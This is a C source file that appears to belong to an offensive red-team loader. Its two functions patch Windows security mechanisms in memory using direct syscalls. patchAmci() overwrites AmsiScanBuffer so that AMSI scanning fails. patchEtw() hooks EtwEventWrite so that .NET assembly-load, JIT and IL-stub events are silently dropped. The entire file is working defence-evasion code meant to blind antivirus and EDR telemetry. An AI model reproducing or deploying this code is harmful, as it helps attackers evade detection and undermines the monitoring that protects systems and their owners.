#include "Util.h"
#include "PEB.h"
#include "syscalls.h"

#ifdef WIN_X64
UCHAR _patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
#ifdef WIN_X86
UCHAR _patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
#endif

#define ModuleLoad_V2 152
#define AssemblyDCStart_V1 155
#define MethodLoadVerbose_V1 143
#define MethodJittingStarted 145
#define ILStubGenerated 88

UCHAR _etwHook[] = {
	0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xE0
};

void patchAmci() {

	_PFNAmsiScanBuffer AmsiScanBuffer;

	ADDR amsi_base = findModuleBase(_amsidll);

	printf("[+]: Start Patching AMSI...\n");
	fflush(stdout);
	printf("[+]: AMSI.DLL Module Base Address: 0x%x\n", amsi_base);
	fflush(stdout);

	if (amsi_base != NULL) {
		AmsiScanBuffer = (_PFNAmsiScanBuffer)findExportAddr(amsi_base, _AmsiScanBuffer);
		printf("[+]: AmsiScanBuffer Export located at Address: 0x%x\n", AmsiScanBuffer);
		fflush(stdout);

		ULONG OldProtection, NewProtection;
		LPVOID lpBaseAddress = (LPVOID)AmsiScanBuffer;
		SIZE_T pSize = sizeof(_patchBytes);
		NTSTATUS status;
		SIZE_T page = 4096;
		status = NtProtectVirtualMemory(NtGetCurrentProcess(), &lpBaseAddress, &page, PAGE_READWRITE, &OldProtection);
		
		if (status != 0) {
			printf("[!]: Error NtProtectVirtualMemory \n");
			fflush(stdout);
		}

		lpBaseAddress = (LPVOID)AmsiScanBuffer;
		printf("[+]: Patching AmsiScanBuffer 0x%x\n", lpBaseAddress);
		fflush(stdout);

		SIZE_T numBytes = NULL;
		status = NtWriteVirtualMemory(NtGetCurrentProcess(), lpBaseAddress, (PVOID)_patchBytes, pSize, &numBytes);
		if (status != 0) {
			printf("[!]: Error NtWriteVirtualMemory\n");
			fflush(stdout);
		}

		printf("[+]: %d bytes patched\n", numBytes);

		status = NtProtectVirtualMemory(NtGetCurrentProcess(), &lpBaseAddress, &page, OldProtection, &NewProtection);
		if (status != 0) {
			printf("[!]: Error NtProtectVirtualMemory First\n");
			fflush(stdout);
		}

		printf("[+]: AMSI Patching Done.\n");
		_separator();
		fflush(stdout);
	}

}

ULONG NTAPI MyEtwEventWrite(__in REGHANDLE RegHandle, __in PCEVENT_DESCRIPTOR EventDescriptor, __in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData) {

	_PFNEtwEventWriteFull EtwEventWriteFull;
	ADDR ntdll_base = findModuleBase(_ntdlldll);
	EtwEventWriteFull = (_PFNEtwEventWriteFull)findExportAddr(ntdll_base, _EtwEventWriteFull);

	ULONG uResult = 0;

	if (EtwEventWriteFull == NULL) {
		printf("\t\t[!]: Error EtwEventWriteFull \n");
		return 1;
	}

	switch (EventDescriptor->Id) {
	case AssemblyDCStart_V1:
		break;
	case MethodLoadVerbose_V1:
		break;
	case ILStubGenerated:
		break;
	default:
		uResult = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);
	}

	return uResult;
}

void patchEtw() {

	printf("[+]: Patching ETW...\n");
	fflush(stdout);

	NTSTATUS status;

	printf("[+]: Retrieving EtwEvenWrite Address from NTDLL...\n");
	fflush(stdout);

	ADDR ntdll_base = findModuleBase(_ntdlldll);
	ULONG newProtection, oldProtection;

	printf("[+]: NTDLL.DLL Module Base Address: 0x%x\n", ntdll_base);
	fflush(stdout);

	// Get the EventWrite function
	LPVOID eventWriteAddr = (LPVOID)findExportAddr(ntdll_base, _EtwEventWrite);
	LPVOID etwAddr = eventWriteAddr;
	printf("[+]: EtwEvenWrite Export located at Address: 0x%x\n", eventWriteAddr);
	fflush(stdout);

	// Change page permissions.
	SIZE_T hookSize = sizeof(_etwHook);
	SIZE_T page = 4096;

	status = NtProtectVirtualMemory(NtGetCurrentProcess(), &eventWriteAddr, &page, PAGE_EXECUTE_READWRITE, &oldProtection);
	if (status != 0) {
		printf("[!]: Error NtProtectVirtualMemory \n");
		fflush(stdout);
	}
	eventWriteAddr = etwAddr;
	printf("[+]: Patching EtwEvenWrite 0x%x\n", eventWriteAddr);
	fflush(stdout);

	// Add address of hook function to patch.
	*(DWORD64*)&_etwHook[2] = (DWORD64)MyEtwEventWrite;

	// Patching ETW
	status = NtWriteVirtualMemory(NtGetCurrentProcess(), eventWriteAddr, (PVOID)_etwHook, hookSize, NULL);
	if (status != 0) {
		printf("[!]: Error NtWriteVirtualMemory\n");
		fflush(stdout);
	}

	status = NtProtectVirtualMemory(NtGetCurrentProcess(), &eventWriteAddr, &page, oldProtection, &newProtection);

	if (status != 0) {
		printf("[!]: Error NtProtectVirtualMemory First\n");
		fflush(stdout);
	}

	printf("[+]: ETW Patchine Done.\n");
	_separator();
	fflush(stdout);

}
